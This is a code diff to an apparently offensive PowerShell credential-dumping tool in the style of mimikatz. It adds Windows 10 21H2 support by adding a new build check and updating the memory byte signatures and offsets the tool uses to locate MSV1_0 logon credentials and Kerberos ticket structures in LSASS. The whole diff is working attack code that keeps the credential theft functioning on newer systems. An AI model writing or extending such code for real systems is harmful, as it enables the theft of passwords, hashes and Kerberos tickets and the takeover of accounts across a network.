@@ -1280,7 +1280,7 @@ $Start = Get-Date
         $WIN_10_1803 = 17134
         $WIN_10_1809 = 17763
         $WIN_10_1903 = 18362
-    
+        $WIN_10_21H2 = 19044
         $Pattern = $null
         $offset_to_FirstEntry = $null
         $offset_to_SessionCounter = $null
@@ -1456,12 +1456,26 @@ $Start = Get-Date
             $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
             $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_10_1607" 
             }
-        else
+        elseif($OSVersion -le $WIN_10_21H2)
             {
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Credential template identfied and selected")
             $Pattern = "33FF4189374C8BF34585C074"
             $offset_to_FirstEntry = 23
+            $offset_to_SessionCounter = -4
+            $ParsingFunction = "Get-MSV1_0_LIST_63"
+            $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
+            $kerberossignature = "488B18488D0D"
+            $kerberos_offset = 6
+            $Kerberos_login_session = "Get-KIWI_KERBEROS_LOGON_SESSION_10_1607"
+            $kerberos_ticket_struct = "Get-Kerberos_Internal_Ticket_10_1607"
+            }
+        else
+            {
+                Write-Debug -Message ("Identified OS Version is " + $OSVersion)
+                Write-Debug -Message ("Credential template identfied and selected")
+            $Pattern = "458934244C8BFF8BF34585C074"
+            $offset_to_FirstEntry = 24
             $offset_to_SessionCounter = -4
             $ParsingFunction = "Get-MSV1_0_LIST_63"
             $CredParsingFunction = "Parse-PrimaryCredential-Win10-1607"
